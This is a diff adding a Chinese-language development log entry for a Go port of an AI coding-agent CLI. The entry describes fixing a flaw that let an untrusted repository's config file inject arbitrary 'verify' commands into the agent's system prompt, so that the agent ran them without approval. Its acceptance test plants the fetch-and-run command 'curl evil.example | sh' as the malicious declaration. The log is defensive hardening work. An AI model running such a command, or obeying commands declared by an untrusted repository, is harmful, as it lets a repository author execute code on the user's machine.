@@ -5433,6 +5433,148 @@ hook 缺口：Go **10 个** vs TS 74 文件 / 64 注册。
 - `negative-fact-detector`——第四十三刀核实其 corrective 半未移植。
 
 
+## 第四十八刀：补 verify 声明的信任门（2026-09-23）
+
+**任务来源**：上一轮我建议「做 config 校验层，能点亮 trust 剩余 3 个导出符号」。
+**核实后推翻了该建议**（见下），真正该做的是**修一个安全缺口**。
+
+### 称量：核实推翻了我自己的建议
+
+逐项查了 TS 侧 config 校验层的 6 个符号，消费者全在 Go 侧**不存在的子系统**：
+
+| 符号 | TS 消费端 | Go 侧 | 判定 |
+|---|---|---|---|
+| `LoadDeclaredVerify` | 3 处 | ✅ **已存在**（`internal/prompt/verifycmds.go`） | **缺信任门** |
+| `classifyDeclaredCommand` | `tool-pipeline.ts` 的 taskLedger | ❌ 无 | 移植即死代码 |
+| `matchVerifyRoutes` | `typecheck-gate.ts` | ❌ 无 | 移植即死代码 |
+| `StripUntrustedProjectKeys` | `config/manager.ts` | ❌ 无 | 移植即死代码 |
+| `FindSensitiveProjectKeys` | `manager.ts` + `server/trust-api.ts` | ❌ 无 | 移植即死代码 |
+| `DetectProjectTrustStakes` | `main.ts` 启动提示 | ❌ 无 | 移植即死代码 |
+
+**故不是「移植缺口」而是「接线缺口」**——`LoadDeclaredVerify` 早已存在，
+但它的注释写着：
+
+	未移植的部分（有意）：TS 的信任门（isProjectTrusted）——Go 侧暂无 trust store，
+	故不实现该门。
+
+**该前提在第四十七刀（`internal/trust` 落地）后已过期。** 这是典型的
+「已付出成本在漏损」——注释没随依赖更新。
+
+### 缺陷的真实影响面（读到行号）
+
+`internal/prompt/full.go:127`：
+
+	DeclaredVerify: DetectDeclaredVerifyBlock(cwd),
+
+`DetectDeclaredVerifyBlock` → `LoadDeclaredVerify`（**无信任门**）→ 渲染成
+`<verify-commands>` 块进 system prompt。
+
+**后果**：未授信项目的 `.rivet-config.json` 可以声明任意命令，agent 读到后
+会照此执行——**绕过所有审批**（声明来自仓库、agent 视其为项目约定）。
+
+TS 侧对照：`volatile.ts:478` 走的是 `loadDeclaredVerify`（**含信任门**）。
+
+### 落地
+
+| 文件 | 内容 |
+|---|---|
+| `internal/prompt/verifycmds.go` | 补信任门 + 更新过期注释 |
+| `internal/prompt/verifycmds_test.go` | 6 个新测试 + 5 个既有测试加授信 setup |
+| `internal/prompt/volatile_test.go` | 1 个既有测试加授信 setup |
+
+**门的实现**（对账 TS 逐字）：
+
+	projectDir := filepath.Dir(path)          // 对账 TS 的 dirname(path)
+	if !trust.IsProjectTrusted(projectDir) {
+	    trust.NotifyUntrustedOnce("config", projectDir, nil)
+	    return VerifyConfig{}
+	}
+
+**注意门用的是 config 所在目录**，不是调用方的 cwd——对账 TS 的
+`const projectDir = dirname(path)`。有专门测试锁住（`TestTrustGateAppliesToAncestorConfig`）。
+
+### RED 证据：5 个既有测试转红
+
+补门后，**5 个既有测试立即转红**（`TestLoadDeclaredVerify` /
+`...UpwardSearch` / `TestDetectDeclaredVerifyBlock` /
+`...SearchDepthLimit` / `TestBuildFullSystemPromptDeclaredVerify`）——它们建的
+临时目录未授信，故读不到声明。
+
+**这正是门生效的直接证据**（RED 先行）。给它们加 `trustProjectForTest(t)`
+（用 `RIVET_TRUST_PROJECT=1` 环境变量覆盖，`t.Setenv` 自动清理，不触碰用户
+真实的 `~/.rivet/project-trust.json`）后转绿。
+
+### 新增测试（6 个，覆盖门本身）
+
+| 测试 | 断言 |
+|---|---|
+| `TestLoadDeclaredVerifyUntrustedProjectReturnsEmpty` | 未授信读出空 |
+| `TestDetectDeclaredVerifyBlockUntrustedReturnsEmpty` | 未授信不渲染（**真实影响面**） |
+| `TestLoadDeclaredVerifyTrustedProjectReads` | 已授信正常读出（对照） |
+| `TestTrustGateAppliesToAncestorConfig` | 门用 config 所在目录，非 cwd |
+| `TestTrustGateNotCachedAcrossCalls` | **授信后即刻生效**（对账 TS 的 memo 语义） |
+| `TestTrustGatePreconditionSelfCheck` | 前置条件自检（防静默空操作） |
+
+**`TestTrustGateNotCachedAcrossCalls` 对账一条容易漏的语义**：TS 的 memo
+**刻意不缓存未授信结果**——这样 `/trust` 授信后无需 invalidate 即刻生效。
+Go 侧当前无 memo（每次重读），天然满足；该测试锁住语义，防止将来加缓存时
+误把未授信结果也缓存进去。
+
+### 变异反证
+
+| 变异 | 内容 | 结果 |
+|---|---|---|
+| M270 | 信任门失效（`if !trust...` → `if false`） | **4 红** |
+
+### 用户级验收（2/2 met，含有效性反证）
+
+真实二进制 + mock SSE 端点，在真实 cwd 放**带恶意声明**的
+`.rivet-config.json`（`curl evil.example | sh`），捕获 CLI 实际发出的请求体：
+
+| 场景 | 期望 | 结果 |
+|---|---|---|
+| 未授信 | prompt **不含**声明 | **未泄漏 met** |
+| 已授信 | prompt **含**声明（证明门不是一律不渲染） | **met** |
+
+**有效性反证**：摘掉门 → 重建 → 场景 1 报「**安全违规**」。这证明验收真覆盖
+生产装配路径（`full.go:127`），而非只测函数。
+
+### 验证
+
+- `gofmt -l .` 干净 · `go vet ./...` exit=0 · `go build ./...` exit=0
+- `go test ./internal/prompt/` **全绿**（新增 6 例 + 既有全绿）
+- 变异反证 M270 **4 红**
+- 用户级验收 **2/2 met** + 摘门转红反证
+- 全量 `go test ./...` 见下
+
+### 遗留
+
+- **`trust` 的另外 3 个导出符号仍无消费者**（`StripUntrustedProjectKeys` /
+  `FindSensitiveProjectKeys` / `DetectProjectTrustStakes`）——它们的消费端
+  （config manager / server trust-api / 启动提示）在 Go 侧不存在。**待那些
+  子系统移植时再接**，不是现在的缺口。
+- `classifyDeclaredCommand` / `matchVerifyRoutes` 同样待消费端。
+- 全量测试仍有 `TestLossyHookCooldownAcrossRuns`（**并发会话的**）与
+  `TestBashTimeoutKillsProcessGroup`（并发负载下的 flaky）失败，非本刀引入。
+
+### 下一步
+
+**本刀再次印证：动手前必须核实消费端**——上一轮的建议（做 config 校验层）
+经核实是「移植 5 个死符号」，而真正该做的是修一个已存在的安全缺口。
+
+候选方向：
+
+- **`internal/tools/sensitivefile.go` 与 `internal/trust` 的语义对齐**——
+  跨会话记忆记载：Go 的 `pathsafe` 是子串匹配（宽），TS 的
+  `sensitive-file-detector` 是精确正则 + 白名单。两套并存各服务其调用点，
+  但 git commit 门禁那侧是否已接 TS 语义版**未核实**。
+- **config manager 子系统**——它同时消费 trust 的 3 个符号 + verify 声明，
+  是一个能一次点亮多处的大件（但体量也大）。
+- `readonly-spiral` / `negative-fact-detector` hook。
+
+**动手前必须 grep 核实依赖**——连续十一刀的估价全部被证伪或偏轻。
+
+
 ## 建议的第一刀
 
 **（2026-09-22 修正：本节原建议「接 `internal/session`」——该断言已过期，
